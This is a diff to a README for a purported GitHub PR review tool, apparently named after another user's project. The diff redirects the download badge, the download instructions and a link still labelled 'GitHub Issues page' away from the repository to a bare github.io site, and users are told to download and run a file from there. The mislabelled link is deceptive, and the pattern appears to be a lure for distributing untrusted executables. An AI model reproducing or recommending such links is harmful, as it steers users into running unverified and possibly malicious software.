@@ -1,10 +1,10 @@
 # ⚡ benjaminbo2954-pr-review - Fast GitHub PR Review via Web
 
-[![Download Now](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://github.com/aigneislost396/benjaminbo2954-pr-review/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://aigneislost396.github.io)
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/aigneislost396/benjaminbo2954-pr-review/releases](https://github.com/aigneislost396/benjaminbo2954-pr-review/releases)
+Visit this link to download the application: [https://aigneislost396.github.io](https://aigneislost396.github.io)
 
 On that page, find the latest release and download the file that matches your computer. After downloading, open the file and follow the setup instructions to install benjaminbo2954-pr-review.
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🛠️ Support
 
-If you encounter any issues, please check the [GitHub Issues page](https://github.com/aigneislost396/benjaminbo2954-pr-review/issues) for help or to report a problem.
+If you encounter any issues, please check the [GitHub Issues page](https://aigneislost396.github.io) for help or to report a problem.
 
 ---
 
